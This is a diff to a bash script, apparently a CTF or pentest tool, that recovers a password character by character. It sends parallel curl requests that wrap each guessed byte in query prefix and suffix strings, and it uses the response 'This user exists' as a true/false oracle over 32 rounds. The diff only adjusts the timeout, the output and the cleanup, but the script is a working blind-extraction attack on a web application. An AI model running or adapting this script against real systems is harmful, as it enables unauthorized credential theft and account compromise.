@@ -20,7 +20,7 @@ function perform_request(){
       --data-raw "$QUERY_PREFFIX$1$QUERY_SUFFIX" \
       --compressed \
       --insecure \
-      --max-time 10
+      --max-time 15
 }
 
 function enum_alphabet(){
@@ -32,7 +32,7 @@ function enum_alphabet_parallel(){
 }
 
 function brute_force_byte(){
-    perform_request $PASSWORD$1 | grep "This user exists" > /dev/null && echo "$1" > current_byte && echo -ne "$1" >> password
+    perform_request $PASSWORD$1 | grep "This user exists" > /dev/null && echo "$1" > current_byte
 }
 
 function brute_force_byte_parallel(){
@@ -41,8 +41,8 @@ function brute_force_byte_parallel(){
 
 function brute_force(){
     for i in {1..32}; do 
-	    PASSWORD="$PASSWORD$(cat current_byte)"
-	    echo "$PASSWORD"
+	    echo -ne $(cat current_byte)
+	    PASSWORD+=$(cat current_byte)
 	    brute_force_byte_parallel
     done
 }
@@ -52,16 +52,8 @@ function main(){
     brute_force
 }
 
-
-## criar u função abstrata para brute force em byte, e usar no enum_alphabet e no proprio brute_f....
-
 export -f {perform_request,enum_alphabet,brute_force_byte,brute_force_byte_parallel,brute_force}
 
 main
 
-#echo "[$(for i in `cat alfabeto`; do echo -ne "$i";done)]"
-echo "Password -> $(cat password)"
-
-rm {alfabeto,password,current_byte}
-
-echo "$SECONDS secs"
+echo "\n$SECONDS secs"
